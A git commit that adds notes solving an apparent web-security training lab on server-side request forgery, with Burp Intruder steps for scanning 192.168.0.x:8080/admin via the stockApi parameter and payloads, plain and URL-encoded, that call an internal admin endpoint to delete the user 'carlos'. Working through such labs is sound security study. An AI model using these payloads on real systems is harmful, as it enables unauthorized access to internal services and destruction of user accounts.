fec5ca7008c397a276400f2c22d32f4a354e24b2
Pranjal <pranjalruhela2811@gmail.com>
2023-07-02 20:37:57 +0530

    SSRF to backend internal systems

---
+++ SSRF/Basic SSRF against another back-end system/payload.js
@@ -0,0 +1,7 @@
+/*
+Evaluate the POST /product/stock
+send to intruder 
+stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2Fadmin
+/http://192.168.0.134:8080/admin/delete?username=carlos
+http%3A%2F%2F192.168.0.134%3A8080%2Fadmin/delete%3Fusername%3Dcarlos
+*/
